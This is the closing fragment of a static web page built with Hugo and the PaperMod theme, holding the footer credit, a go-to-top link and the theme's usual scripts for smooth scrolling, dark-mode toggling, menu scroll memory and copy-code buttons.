        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
